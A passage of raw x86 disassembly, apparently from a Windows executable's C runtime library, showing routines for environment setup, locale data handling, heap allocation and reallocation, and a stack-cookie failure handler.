  42061c:	push   esi
  42061d:	mov    ecx,eax
  42061f:	call   0x42289b
  420624:	mov    eax,DWORD PTR [ebp+0xc]
  420627:	mov    DWORD PTR [eax+0xc],ebx
  42062a:	mov    eax,DWORD PTR [edi]
  42062c:	cmp    eax,0xfffffffe
  42062f:	je     0x4206a6
  420631:	jmp    0x420699
  420633:	mov    cl,BYTE PTR [ebp-0x1]
  420636:	mov    DWORD PTR [ebp-0x8],ebx
  420639:	mov    eax,ebx
  42063b:	cmp    ebx,0xfffffffe
  42063e:	jne    0x4205a2
  420644:	test   cl,cl
  420646:	je     0x42068f
  420648:	jmp    0x42066b
  42064a:	mov    DWORD PTR [ebp-0xc],0x0
  420651:	jmp    0x42066b
  420653:	cmp    DWORD PTR [ebx+0xc],0xfffffffe
  420657:	je     0x42068f
  420659:	push   0x4314e0
  42065e:	push   esi
  42065f:	mov    ecx,ebx
  420661:	mov    edx,0xfffffffe
  420666:	call   0x42289b
  42066b:	mov    eax,DWORD PTR [edi]
  42066d:	cmp    eax,0xfffffffe
  420670:	je     0x42067f
  420672:	mov    ecx,DWORD PTR [edi+0x4]
  420675:	add    ecx,esi
  420677:	xor    ecx,DWORD PTR [eax+esi*1]
  42067a:	call   0x421878
  42067f:	mov    edx,DWORD PTR [edi+0x8]
  420682:	mov    ecx,DWORD PTR [edi+0xc]
  420685:	add    ecx,esi
  420687:	xor    ecx,DWORD PTR [edx+esi*1]
  42068a:	call   0x421878
  42068f:	mov    eax,DWORD PTR [ebp-0xc]
  420692:	pop    edi
  420693:	pop    esi
  420694:	pop    ebx
  420695:	mov    esp,ebp
  420697:	pop    ebp
  420698:	ret    
  420699:	mov    ecx,DWORD PTR [edi+0x4]
  42069c:	add    ecx,esi
  42069e:	xor    ecx,DWORD PTR [eax+esi*1]
  4206a1:	call   0x421878
  4206a6:	mov    eax,DWORD PTR [edi+0x8]
  4206a9:	mov    ecx,DWORD PTR [edi+0xc]
  4206ac:	add    ecx,esi
  4206ae:	xor    ecx,DWORD PTR [eax+esi*1]
  4206b1:	call   0x421878
  4206b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4206b9:	mov    edx,esi
  4206bb:	mov    ecx,DWORD PTR [ecx+0x8]
  4206be:	call   0x422869
  4206c3:	int3   
  4206c4:	push   ebp
  4206c5:	mov    ebp,esp
  4206c7:	mov    eax,DWORD PTR [ebp+0x8]
  4206ca:	mov    ds:0x4327a8,eax
  4206cf:	pop    ebp
  4206d0:	ret    
  4206d1:	cmp    DWORD PTR ds:0x433bf4,0x0
  4206d8:	jne    0x4206df
  4206da:	call   0x41ef5a
  4206df:	push   esi
  4206e0:	mov    esi,DWORD PTR ds:0x431db4
  4206e6:	push   edi
  4206e7:	xor    edi,edi
  4206e9:	test   esi,esi
  4206eb:	jne    0x420704
  4206ed:	or     eax,0xffffffff
  4206f0:	jmp    0x42078b
  4206f5:	cmp    al,0x3d
  4206f7:	je     0x4206fa
  4206f9:	inc    edi
  4206fa:	push   esi
  4206fb:	call   0x422a80
  420700:	inc    esi
  420701:	pop    ecx
  420702:	add    esi,eax
  420704:	mov    al,BYTE PTR [esi]
  420706:	test   al,al
  420708:	jne    0x4206f5
  42070a:	lea    eax,[edi+0x1]
  42070d:	push   0x4
  42070f:	push   eax
  420710:	call   0x41ef78
  420715:	mov    edi,eax
  420717:	mov    DWORD PTR ds:0x431dcc,edi
  42071d:	pop    ecx
  42071e:	pop    ecx
  42071f:	test   edi,edi
  420721:	je     0x4206ed
  420723:	mov    esi,DWORD PTR ds:0x431db4
  420729:	push   ebx
  42072a:	cmp    BYTE PTR [esi],0x0
  42072d:	je     0x42076d
  42072f:	push   esi
  420730:	call   0x422a80
  420735:	cmp    BYTE PTR [esi],0x3d
  420738:	pop    ecx
  420739:	lea    ebx,[eax+0x1]
  42073c:	je     0x420760
  42073e:	push   0x1
  420740:	push   ebx
  420741:	call   0x41ef78
  420746:	mov    DWORD PTR [edi],eax
  420748:	pop    ecx
  420749:	pop    ecx
  42074a:	test   eax,eax
  42074c:	je     0x42078e
  42074e:	push   esi
  42074f:	push   ebx
  420750:	push   eax
  420751:	call   0x41f159
  420756:	add    esp,0xc
  420759:	test   eax,eax
  42075b:	jne    0x4207a5
  42075d:	add    edi,0x4
  420760:	add    esi,ebx
  420762:	cmp    BYTE PTR [esi],0x0
  420765:	jne    0x42072f
  420767:	mov    esi,DWORD PTR ds:0x431db4
  42076d:	push   esi
  42076e:	call   0x41f0cb
  420773:	and    DWORD PTR ds:0x431db4,0x0
  42077a:	and    DWORD PTR [edi],0x0
  42077d:	xor    eax,eax
  42077f:	mov    DWORD PTR ds:0x433bf8,0x1
  420789:	pop    ecx
  42078a:	pop    ebx
  42078b:	pop    edi
  42078c:	pop    esi
  42078d:	ret    
  42078e:	push   DWORD PTR ds:0x431dcc
  420794:	call   0x41f0cb
  420799:	and    DWORD PTR ds:0x431dcc,0x0
  4207a0:	or     eax,0xffffffff
  4207a3:	jmp    0x420789
  4207a5:	xor    eax,eax
  4207a7:	push   eax
  4207a8:	push   eax
  4207a9:	push   eax
  4207aa:	push   eax
  4207ab:	push   eax
  4207ac:	call   0x41fb45
  4207b1:	int3   
  4207b2:	push   ebp
  4207b3:	mov    ebp,esp
  4207b5:	push   esi
  4207b6:	mov    esi,ecx
  4207b8:	mov    ecx,DWORD PTR [ebp+0x8]
  4207bb:	mov    BYTE PTR [esi+0xc],0x0
  4207bf:	test   ecx,ecx
  4207c1:	jne    0x420829
  4207c3:	push   edi
  4207c4:	call   0x42150f
  4207c9:	mov    edi,eax
  4207cb:	mov    DWORD PTR [esi+0x8],edi
  4207ce:	mov    edx,DWORD PTR [edi+0x6c]
  4207d1:	mov    DWORD PTR [esi],edx
  4207d3:	mov    ecx,DWORD PTR [edi+0x68]
  4207d6:	mov    DWORD PTR [esi+0x4],ecx
  4207d9:	cmp    edx,DWORD PTR ds:0x430aec
  4207df:	je     0x4207f2
  4207e1:	mov    eax,ds:0x4314f4
  4207e6:	test   DWORD PTR [edi+0x70],eax
  4207e9:	jne    0x4207f2
  4207eb:	call   0x4210f6
  4207f0:	mov    DWORD PTR [esi],eax
  4207f2:	mov    eax,DWORD PTR [esi+0x4]
  4207f5:	pop    edi
  4207f6:	cmp    eax,DWORD PTR ds:0x430fd4
  4207fc:	je     0x420813
  4207fe:	mov    ecx,DWORD PTR [esi+0x8]
  420801:	mov    eax,ds:0x4314f4
  420806:	test   DWORD PTR [ecx+0x70],eax
  420809:	jne    0x420813
  42080b:	call   0x41f2ab
  420810:	mov    DWORD PTR [esi+0x4],eax
  420813:	mov    ecx,DWORD PTR [esi+0x8]
  420816:	mov    eax,DWORD PTR [ecx+0x70]
  420819:	test   al,0x2
  42081b:	jne    0x420833
  42081d:	or     eax,0x2
  420820:	mov    DWORD PTR [ecx+0x70],eax
  420823:	mov    BYTE PTR [esi+0xc],0x1
  420827:	jmp    0x420833
  420829:	mov    eax,DWORD PTR [ecx]
  42082b:	mov    DWORD PTR [esi],eax
  42082d:	mov    eax,DWORD PTR [ecx+0x4]
  420830:	mov    DWORD PTR [esi+0x4],eax
  420833:	mov    eax,esi
  420835:	pop    esi
  420836:	pop    ebp
  420837:	ret    0x4
  42083a:	push   0x8
  42083c:	push   0x42d9c8
  420841:	call   0x4221c0
  420846:	mov    esi,DWORD PTR [ebp+0x8]
  420849:	test   esi,esi
  42084b:	je     0x42094f
  420851:	cmp    DWORD PTR [esi+0x24],0x0
  420855:	je     0x420860
  420857:	push   DWORD PTR [esi+0x24]
  42085a:	call   0x41f0cb
  42085f:	pop    ecx
  420860:	cmp    DWORD PTR [esi+0x2c],0x0
  420864:	je     0x42086f
  420866:	push   DWORD PTR [esi+0x2c]
  420869:	call   0x41f0cb
  42086e:	pop    ecx
  42086f:	cmp    DWORD PTR [esi+0x34],0x0
  420873:	je     0x42087e
  420875:	push   DWORD PTR [esi+0x34]
  420878:	call   0x41f0cb
  42087d:	pop    ecx
  42087e:	cmp    DWORD PTR [esi+0x3c],0x0
  420882:	je     0x42088d
  420884:	push   DWORD PTR [esi+0x3c]
  420887:	call   0x41f0cb
  42088c:	pop    ecx
  42088d:	cmp    DWORD PTR [esi+0x40],0x0
  420891:	je     0x42089c
  420893:	push   DWORD PTR [esi+0x40]
  420896:	call   0x41f0cb
  42089b:	pop    ecx
  42089c:	cmp    DWORD PTR [esi+0x44],0x0
  4208a0:	je     0x4208ab
  4208a2:	push   DWORD PTR [esi+0x44]
  4208a5:	call   0x41f0cb
  4208aa:	pop    ecx
  4208ab:	cmp    DWORD PTR [esi+0x48],0x0
  4208af:	je     0x4208ba
  4208b1:	push   DWORD PTR [esi+0x48]
  4208b4:	call   0x41f0cb
  4208b9:	pop    ecx
  4208ba:	cmp    DWORD PTR [esi+0x5c],0x429e20
  4208c1:	je     0x4208cc
  4208c3:	push   DWORD PTR [esi+0x5c]
  4208c6:	call   0x41f0cb
  4208cb:	pop    ecx
  4208cc:	push   0xd
  4208ce:	call   0x41fabe
  4208d3:	pop    ecx
  4208d4:	and    DWORD PTR [ebp-0x4],0x0
  4208d8:	mov    ecx,DWORD PTR [esi+0x68]
  4208db:	test   ecx,ecx
  4208dd:	je     0x4208f7
  4208df:	or     eax,0xffffffff
  4208e2:	lock xadd DWORD PTR [ecx],eax
  4208e6:	jne    0x4208f7
  4208e8:	cmp    ecx,0x430db0
  4208ee:	je     0x4208f7
  4208f0:	push   ecx
  4208f1:	call   0x41f0cb
  4208f6:	pop    ecx
  4208f7:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4208fe:	call   0x42095a
  420903:	push   0xc
  420905:	call   0x41fabe
  42090a:	pop    ecx
  42090b:	mov    DWORD PTR [ebp-0x4],0x1
  420912:	mov    edi,DWORD PTR [esi+0x6c]
  420915:	test   edi,edi
  420917:	je     0x42093c
  420919:	push   edi
  42091a:	call   0x41fdda
  42091f:	pop    ecx
  420920:	cmp    edi,DWORD PTR ds:0x430aec
  420926:	je     0x42093c
  420928:	cmp    edi,0x430af0
  42092e:	je     0x42093c
  420930:	cmp    DWORD PTR [edi],0x0
  420933:	jne    0x42093c
  420935:	push   edi
  420936:	call   0x42096f
  42093b:	pop    ecx
  42093c:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  420943:	call   0x420966
  420948:	push   esi
  420949:	call   0x41f0cb
  42094e:	pop    ecx
  42094f:	call   0x422205
  420954:	ret    0x4
  420957:	mov    esi,DWORD PTR [ebp+0x8]
  42095a:	push   0xd
  42095c:	call   0x421933
  420961:	pop    ecx
  420962:	ret    
  420963:	mov    esi,DWORD PTR [ebp+0x8]
  420966:	push   0xc
  420968:	call   0x421933
  42096d:	pop    ecx
  42096e:	ret    
  42096f:	push   ebp
  420970:	mov    ebp,esp
  420972:	push   ebx
  420973:	push   esi
  420974:	mov    esi,DWORD PTR [ebp+0x8]
  420977:	xor    ebx,ebx
  420979:	push   edi
  42097a:	mov    eax,DWORD PTR [esi+0x84]
  420980:	test   eax,eax
  420982:	je     0x4209ea
  420984:	cmp    eax,0x431500
  420989:	je     0x4209ea
  42098b:	mov    eax,DWORD PTR [esi+0x78]
  42098e:	test   eax,eax
  420990:	je     0x4209ea
  420992:	cmp    DWORD PTR [eax],ebx
  420994:	jne    0x4209ea
  420996:	mov    eax,DWORD PTR [esi+0x80]
  42099c:	test   eax,eax
  42099e:	je     0x4209b7
  4209a0:	cmp    DWORD PTR [eax],ebx
  4209a2:	jne    0x4209b7
  4209a4:	push   eax
  4209a5:	call   0x41f0cb
  4209aa:	push   DWORD PTR [esi+0x84]
  4209b0:	call   0x41efcf
  4209b5:	pop    ecx
  4209b6:	pop    ecx
  4209b7:	mov    eax,DWORD PTR [esi+0x7c]
  4209ba:	test   eax,eax
  4209bc:	je     0x4209d5
  4209be:	cmp    DWORD PTR [eax],ebx
  4209c0:	jne    0x4209d5
  4209c2:	push   eax
  4209c3:	call   0x41f0cb
  4209c8:	push   DWORD PTR [esi+0x84]
  4209ce:	call   0x42163b
  4209d3:	pop    ecx
  4209d4:	pop    ecx
  4209d5:	push   DWORD PTR [esi+0x78]
  4209d8:	call   0x41f0cb
  4209dd:	push   DWORD PTR [esi+0x84]
  4209e3:	call   0x41f0cb
  4209e8:	pop    ecx
  4209e9:	pop    ecx
  4209ea:	mov    eax,DWORD PTR [esi+0x88]
  4209f0:	test   eax,eax
  4209f2:	je     0x420a38
  4209f4:	cmp    DWORD PTR [eax],ebx
  4209f6:	jne    0x420a38
  4209f8:	mov    eax,DWORD PTR [esi+0x8c]
  4209fe:	sub    eax,0xfe
  420a03:	push   eax
  420a04:	call   0x41f0cb
  420a09:	mov    eax,DWORD PTR [esi+0x94]
  420a0f:	mov    edi,0x80
  420a14:	sub    eax,edi
  420a16:	push   eax
  420a17:	call   0x41f0cb
  420a1c:	mov    eax,DWORD PTR [esi+0x98]
  420a22:	sub    eax,edi
  420a24:	push   eax
  420a25:	call   0x41f0cb
  420a2a:	push   DWORD PTR [esi+0x88]
  420a30:	call   0x41f0cb
  420a35:	add    esp,0x10
  420a38:	mov    eax,DWORD PTR [esi+0x9c]
  420a3e:	cmp    eax,0x430988
  420a43:	je     0x420a60
  420a45:	cmp    DWORD PTR [eax+0xb0],ebx
  420a4b:	jne    0x420a60
  420a4d:	push   eax
  420a4e:	call   0x41f503
  420a53:	push   DWORD PTR [esi+0x9c]
  420a59:	call   0x41f0cb
  420a5e:	pop    ecx
  420a5f:	pop    ecx
  420a60:	push   0x6
  420a62:	pop    eax
  420a63:	lea    ebx,[esi+0xa0]
  420a69:	mov    DWORD PTR [ebp+0x8],eax
  420a6c:	lea    edi,[esi+0x1c]
  420a6f:	cmp    DWORD PTR [edi-0x8],0x430984
  420a76:	je     0x420a95
  420a78:	mov    eax,DWORD PTR [edi]
  420a7a:	test   eax,eax
  420a7c:	je     0x420a92
  420a7e:	cmp    DWORD PTR [eax],0x0
  420a81:	jne    0x420a92
  420a83:	push   eax
  420a84:	call   0x41f0cb
  420a89:	push   DWORD PTR [ebx]
  420a8b:	call   0x41f0cb
  420a90:	pop    ecx
  420a91:	pop    ecx
  420a92:	mov    eax,DWORD PTR [ebp+0x8]
  420a95:	cmp    DWORD PTR [edi-0xc],0x0
  420a99:	je     0x420ab1
  420a9b:	mov    eax,DWORD PTR [edi-0x4]
  420a9e:	test   eax,eax
  420aa0:	je     0x420aae
  420aa2:	cmp    DWORD PTR [eax],0x0
  420aa5:	jne    0x420aae
  420aa7:	push   eax
  420aa8:	call   0x41f0cb
  420aad:	pop    ecx
  420aae:	mov    eax,DWORD PTR [ebp+0x8]
  420ab1:	add    ebx,0x4
  420ab4:	add    edi,0x10
  420ab7:	dec    eax
  420ab8:	mov    DWORD PTR [ebp+0x8],eax
  420abb:	jne    0x420a6f
  420abd:	push   esi
  420abe:	call   0x41f0cb
  420ac3:	pop    ecx
  420ac4:	pop    edi
  420ac5:	pop    esi
  420ac6:	pop    ebx
  420ac7:	pop    ebp
  420ac8:	ret    
  420ac9:	push   ebp
  420aca:	mov    ebp,esp
  420acc:	push   esi
  420acd:	mov    esi,DWORD PTR [ebp+0x8]
  420ad0:	cmp    esi,0xffffffe0
  420ad3:	ja     0x420b44
  420ad5:	push   ebx
  420ad6:	push   edi
  420ad7:	mov    eax,ds:0x431df0
  420adc:	test   eax,eax
  420ade:	jne    0x420afd
  420ae0:	call   0x420cde
  420ae5:	push   0x1e
  420ae7:	call   0x4202d3
  420aec:	push   0xff
  420af1:	call   0x4211cb
  420af6:	mov    eax,ds:0x431df0
  420afb:	pop    ecx
  420afc:	pop    ecx
  420afd:	test   esi,esi
  420aff:	je     0x420b05
  420b01:	mov    ecx,esi
  420b03:	jmp    0x420b08
  420b05:	xor    ecx,ecx
  420b07:	inc    ecx
  420b08:	push   ecx
  420b09:	push   0x0
  420b0b:	push   eax
  420b0c:	call   DWORD PTR ds:0x4290f0
  420b12:	mov    edi,eax
  420b14:	test   edi,edi
  420b16:	jne    0x420b3e
  420b18:	push   0xc
  420b1a:	pop    ebx
  420b1b:	cmp    DWORD PTR ds:0x432b18,eax
  420b21:	je     0x420b30
  420b23:	push   esi
  420b24:	call   0x41feca
  420b29:	pop    ecx
  420b2a:	test   eax,eax
  420b2c:	jne    0x420ad7
  420b2e:	jmp    0x420b37
  420b30:	call   0x41fb32
  420b35:	mov    DWORD PTR [eax],ebx
  420b37:	call   0x41fb32
  420b3c:	mov    DWORD PTR [eax],ebx
  420b3e:	mov    eax,edi
  420b40:	pop    edi
  420b41:	pop    ebx
  420b42:	jmp    0x420b58
  420b44:	push   esi
  420b45:	call   0x41feca
  420b4a:	pop    ecx
  420b4b:	call   0x41fb32
  420b50:	mov    DWORD PTR [eax],0xc
  420b56:	xor    eax,eax
  420b58:	pop    esi
  420b59:	pop    ebp
  420b5a:	ret    
  420b5b:	push   0xc
  420b5d:	push   0x42db18
  420b62:	call   0x4221c0
  420b67:	and    DWORD PTR [ebp-0x1c],0x0
  420b6b:	call   0x41fec1
  420b70:	and    DWORD PTR [ebp-0x4],0x0
  420b74:	push   DWORD PTR [ebp+0x8]
  420b77:	call   0x422666
  420b7c:	pop    ecx
  420b7d:	mov    esi,eax
  420b7f:	mov    DWORD PTR [ebp-0x1c],esi
  420b82:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  420b89:	call   0x420b99
  420b8e:	mov    eax,esi
  420b90:	call   0x422205
  420b95:	ret    
  420b96:	mov    esi,DWORD PTR [ebp-0x1c]
  420b99:	call   0x420140
  420b9e:	ret    
  420b9f:	push   ebp
  420ba0:	mov    ebp,esp
  420ba2:	mov    eax,DWORD PTR [ebp+0x8]
  420ba5:	test   eax,eax
  420ba7:	js     0x420bca
  420ba9:	cmp    eax,0x2
  420bac:	jle    0x420bbb
  420bae:	cmp    eax,0x3
  420bb1:	jne    0x420bca
  420bb3:	mov    ecx,DWORD PTR ds:0x432630
  420bb9:	jmp    0x420bc6
  420bbb:	mov    ecx,DWORD PTR ds:0x432630
  420bc1:	mov    ds:0x432630,eax
  420bc6:	mov    eax,ecx
  420bc8:	pop    ebp
  420bc9:	ret    
  420bca:	call   0x41fb32
  420bcf:	mov    DWORD PTR [eax],0x16
  420bd5:	call   0x422622
  420bda:	or     eax,0xffffffff
  420bdd:	pop    ebp
  420bde:	ret    
  420bdf:	push   esi
  420be0:	push   edi
  420be1:	call   DWORD PTR ds:0x429030
  420be7:	push   DWORD PTR ds:0x430810
  420bed:	mov    edi,eax
  420bef:	call   0x421e0e
  420bf4:	mov    esi,eax
  420bf6:	pop    ecx
  420bf7:	test   esi,esi
  420bf9:	jne    0x420c42
  420bfb:	push   0x3bc
  420c00:	push   0x1
  420c02:	call   0x41ef78
  420c07:	mov    esi,eax
  420c09:	pop    ecx
  420c0a:	pop    ecx
  420c0b:	test   esi,esi
  420c0d:	je     0x420c42
  420c0f:	push   esi
  420c10:	push   DWORD PTR ds:0x430810
  420c16:	call   0x421e2d
  420c1b:	pop    ecx
  420c1c:	pop    ecx
  420c1d:	test   eax,eax
  420c1f:	je     0x420c39
  420c21:	push   0x0
  420c23:	push   esi
  420c24:	call   0x41f1ae
  420c29:	pop    ecx
  420c2a:	pop    ecx
  420c2b:	call   DWORD PTR ds:0x429040
  420c31:	or     DWORD PTR [esi+0x4],0xffffffff
  420c35:	mov    DWORD PTR [esi],eax
  420c37:	jmp    0x420c42
  420c39:	push   esi
  420c3a:	call   0x41f0cb
  420c3f:	pop    ecx
  420c40:	xor    esi,esi
  420c42:	push   edi
  420c43:	call   DWORD PTR ds:0x42903c
  420c49:	pop    edi
  420c4a:	mov    eax,esi
  420c4c:	pop    esi
  420c4d:	ret    
  420c4e:	int3   
  420c4f:	int3   
  420c50:	push   ebp
  420c51:	mov    ebp,esp
  420c53:	mov    eax,DWORD PTR [ebp+0x8]
  420c56:	xor    edx,edx
  420c58:	push   ebx
  420c59:	push   esi
  420c5a:	push   edi
  420c5b:	mov    ecx,DWORD PTR [eax+0x3c]
  420c5e:	add    ecx,eax
  420c60:	movzx  eax,WORD PTR [ecx+0x14]
  420c64:	movzx  ebx,WORD PTR [ecx+0x6]
  420c68:	add    eax,0x18
  420c6b:	add    eax,ecx
  420c6d:	test   ebx,ebx
  420c6f:	je     0x420c8c
  420c71:	mov    edi,DWORD PTR [ebp+0xc]
  420c74:	mov    esi,DWORD PTR [eax+0xc]
  420c77:	cmp    edi,esi
  420c79:	jb     0x420c84
  420c7b:	mov    ecx,DWORD PTR [eax+0x8]
  420c7e:	add    ecx,esi
  420c80:	cmp    edi,ecx
  420c82:	jb     0x420c8e
  420c84:	inc    edx
  420c85:	add    eax,0x28
  420c88:	cmp    edx,ebx
  420c8a:	jb     0x420c74
  420c8c:	xor    eax,eax
  420c8e:	pop    edi
  420c8f:	pop    esi
  420c90:	pop    ebx
  420c91:	pop    ebp
  420c92:	ret    
  420c93:	and    DWORD PTR ds:0x432b30,0x0
  420c9a:	ret    
  420c9b:	call   0x4217a1
  420ca0:	test   eax,eax
  420ca2:	je     0x420cac
  420ca4:	push   0x16
  420ca6:	call   0x41fef0
  420cab:	pop    ecx
  420cac:	test   BYTE PTR ds:0x4314f0,0x2
  420cb3:	je     0x420cd6
  420cb5:	push   0x17
  420cb7:	call   0x41ef40
  420cbc:	test   eax,eax
  420cbe:	je     0x420cc5
  420cc0:	push   0x7
  420cc2:	pop    ecx
  420cc3:	int    0x29
  420cc5:	push   0x1
  420cc7:	push   0x40000015
  420ccc:	push   0x3
  420cce:	call   0x4224fd
  420cd3:	add    esp,0xc
  420cd6:	push   0x3
  420cd8:	call   0x41f883
  420cdd:	int3   
  420cde:	push   0x3
  420ce0:	call   0x420b9f
  420ce5:	pop    ecx
  420ce6:	cmp    eax,0x1
  420ce9:	je     0x420d00
  420ceb:	push   0x3
  420ced:	call   0x420b9f
  420cf2:	pop    ecx
  420cf3:	test   eax,eax
  420cf5:	jne    0x420d16
  420cf7:	cmp    DWORD PTR ds:0x432000,0x1
  420cfe:	jne    0x420d16
  420d00:	push   0xfc
  420d05:	call   0x4202d3
  420d0a:	push   0xff
  420d0f:	call   0x4202d3
  420d14:	pop    ecx
  420d15:	pop    ecx
  420d16:	ret    
  420d17:	push   ebp
  420d18:	mov    ebp,esp
  420d1a:	cmp    DWORD PTR [ebp+0x8],0x0
  420d1e:	jne    0x420d2b
  420d20:	push   DWORD PTR [ebp+0xc]
  420d23:	call   0x420ac9
  420d28:	pop    ecx
  420d29:	pop    ebp
  420d2a:	ret    
  420d2b:	push   esi
  420d2c:	mov    esi,DWORD PTR [ebp+0xc]
  420d2f:	test   esi,esi
  420d31:	jne    0x420d40
  420d33:	push   DWORD PTR [ebp+0x8]
  420d36:	call   0x41f0cb
  420d3b:	pop    ecx
  420d3c:	xor    eax,eax
  420d3e:	jmp    0x420d8d
  420d40:	push   ebx
  420d41:	jmp    0x420d73
  420d43:	test   esi,esi
  420d45:	jne    0x420d48
  420d47:	inc    esi
  420d48:	push   esi
  420d49:	push   DWORD PTR [ebp+0x8]
  420d4c:	push   0x0
  420d4e:	push   DWORD PTR ds:0x431df0
  420d54:	call   DWORD PTR ds:0x4290f4
  420d5a:	mov    ebx,eax
  420d5c:	test   ebx,ebx
  420d5e:	jne    0x420dbe
  420d60:	cmp    DWORD PTR ds:0x432b18,eax
  420d66:	je     0x420da8
  420d68:	push   esi
  420d69:	call   0x41feca
  420d6e:	pop    ecx
  420d6f:	test   eax,eax
  420d71:	je     0x420d90
  420d73:	cmp    esi,0xffffffe0
  420d76:	jbe    0x420d43
  420d78:	push   esi
  420d79:	call   0x41feca
  420d7e:	pop    ecx
  420d7f:	call   0x41fb32
  420d84:	mov    DWORD PTR [eax],0xc
  420d8a:	xor    eax,eax
  420d8c:	pop    ebx
  420d8d:	pop    esi
  420d8e:	pop    ebp
  420d8f:	ret    
  420d90:	call   0x41fb32
  420d95:	mov    esi,eax
  420d97:	call   DWORD PTR ds:0x429030
  420d9d:	push   eax
  420d9e:	call   0x41f351
  420da3:	pop    ecx
  420da4:	mov    DWORD PTR [esi],eax
  420da6:	jmp    0x420d8a
  420da8:	call   0x41fb32
  420dad:	mov    esi,eax
  420daf:	call   DWORD PTR ds:0x429030
  420db5:	push   eax
  420db6:	call   0x41f351
  420dbb:	pop    ecx
  420dbc:	mov    DWORD PTR [esi],eax
  420dbe:	mov    eax,ebx
  420dc0:	jmp    0x420d8c
  420dc2:	push   ebp
  420dc3:	mov    ebp,esp
  420dc5:	sub    esp,0x324
  420dcb:	push   0x17
  420dcd:	call   0x41ef40
  420dd2:	test   eax,eax
  420dd4:	je     0x420ddb
  420dd6:	push   0x2
  420dd8:	pop    ecx
  420dd9:	int    0x29
  420ddb:	mov    ds:0x4328f8,eax
  420de0:	mov    DWORD PTR ds:0x4328f4,ecx
  420de6:	mov    DWORD PTR ds:0x4328f0,edx
  420dec:	mov    DWORD PTR ds:0x4328ec,ebx
  420df2:	mov    DWORD PTR ds:0x4328e8,esi
  420df8:	mov    DWORD PTR ds:0x4328e4,edi
  420dfe:	data16 mov WORD PTR ds:0x432910,ss
  420e05:	data16 mov WORD PTR ds:0x432904,cs
  420e0c:	data16 mov WORD PTR ds:0x4328e0,ds
  420e13:	data16 mov WORD PTR ds:0x4328dc,es
  420e1a:	data16 mov WORD PTR ds:0x4328d8,fs
  420e21:	data16 mov WORD PTR ds:0x4328d4,gs
  420e28:	pushf  
  420e29:	pop    DWORD PTR ds:0x432908
  420e2f:	mov    eax,DWORD PTR [ebp+0x0]
  420e32:	mov    ds:0x4328fc,eax
  420e37:	mov    eax,DWORD PTR [ebp+0x4]
  420e3a:	mov    ds:0x432900,eax
  420e3f:	lea    eax,[ebp+0x8]
  420e42:	mov    ds:0x43290c,eax
  420e47:	mov    eax,DWORD PTR [ebp-0x324]
  420e4d:	mov    DWORD PTR ds:0x432848,0x10001
  420e57:	mov    eax,ds:0x432900
  420e5c:	mov    ds:0x432804,eax
  420e61:	mov    DWORD PTR ds:0x4327f8,0xc0000409
  420e6b:	mov    DWORD PTR ds:0x4327fc,0x1
  420e75:	mov    DWORD PTR ds:0x432808,0x1
  420e7f:	push   0x4
  420e81:	pop    eax
  420e82:	imul   eax,eax,0x0
  420e85:	mov    DWORD PTR [eax+0x43280c],0x2
  420e8f:	push   0x4
  420e91:	pop    eax
  420e92:	imul   eax,eax,0x0
  420e95:	mov    ecx,DWORD PTR ds:0x4314e0
  420e9b:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  420e9f:	push   0x4
  420ea1:	pop    eax
  420ea2:	shl    eax,0x0
  420ea5:	mov    ecx,DWORD PTR ds:0x4314e4
  420eab:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  420eaf:	push   0x42d8c8
  420eb4:	call   0x423d94
  420eb9:	mov    esp,ebp
  420ebb:	pop    ebp
  420ebc:	ret    
  420ebd:	push   ebp
  420ebe:	mov    ebp,esp
  420ec0:	cmp    DWORD PTR ds:0x42d968,0x0
  420ec7:	je     0x420ee2
  420ec9:	push   0x42d968
  420ece:	call   0x41f8d0
  420ed3:	pop    ecx
  420ed4:	test   eax,eax
  420ed6:	je     0x420ee2
  420ed8:	push   DWORD PTR [ebp+0x8]
  420edb:	call   DWORD PTR ds:0x42d968
  420ee1:	pop    ecx
  420ee2:	call   0x41fdbb
  420ee7:	push   0x42915c
  420eec:	push   0x429144
  420ef1:	call   0x41f98a
  420ef6:	pop    ecx
  420ef7:	pop    ecx
  420ef8:	test   eax,eax
  420efa:	jne    0x420f3f
  420efc:	push   0x41fa9e
  420f01:	call   0x41f445
  420f06:	mov    DWORD PTR [esp],0x429140
  420f0d:	push   0x42913c
  420f12:	call   0x421abf
  420f17:	cmp    DWORD PTR ds:0x433be8,0x0
  420f1e:	pop    ecx
  420f1f:	pop    ecx
  420f20:	je     0x420f3d
  420f22:	push   0x433be8
  420f27:	call   0x41f8d0
  420f2c:	pop    ecx
  420f2d:	test   eax,eax
  420f2f:	je     0x420f3d
  420f31:	push   0x0
  420f33:	push   0x2
  420f35:	push   0x0
  420f37:	call   DWORD PTR ds:0x433be8
  420f3d:	xor    eax,eax
  420f3f:	pop    ebp
  420f40:	ret    
  420f41:	push   ebp
  420f42:	mov    ebp,esp
  420f44:	mov    eax,DWORD PTR [ebp+0x8]
  420f47:	mov    ds:0x4327ac,eax
  420f4c:	pop    ebp
  420f4d:	ret    
  420f4e:	push   0x10
  420f50:	push   0x42dad8
  420f55:	call   0x4221c0
  420f5a:	or     edi,0xffffffff
  420f5d:	call   0x42150f
  420f62:	mov    ebx,eax
  420f64:	mov    DWORD PTR [ebp-0x20],ebx
  420f67:	call   0x41f2ab
  420f6c:	mov    esi,DWORD PTR [ebx+0x68]
  420f6f:	push   DWORD PTR [ebp+0x8]
  420f72:	call   0x42229e
  420f77:	pop    ecx
  420f78:	mov    DWORD PTR [ebp+0x8],eax
  420f7b:	cmp    eax,DWORD PTR [esi+0x4]
  420f7e:	je     0x4210ec
  420f84:	push   0x220
  420f89:	call   0x41fe7a
  420f8e:	pop    ecx
  420f8f:	mov    ebx,eax
  420f91:	test   ebx,ebx
  420f93:	je     0x4210ee
  420f99:	mov    ecx,0x88
  420f9e:	mov    eax,DWORD PTR [ebp-0x20]
  420fa1:	mov    esi,DWORD PTR [eax+0x68]
  420fa4:	mov    edi,ebx
  420fa6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fa8:	xor    esi,esi
  420faa:	mov    DWORD PTR [ebx],esi
  420fac:	push   ebx
  420fad:	push   DWORD PTR [ebp+0x8]
  420fb0:	call   0x41fb81
  420fb5:	pop    ecx
  420fb6:	pop    ecx
  420fb7:	mov    edi,eax
  420fb9:	mov    DWORD PTR [ebp+0x8],edi
  420fbc:	test   edi,edi
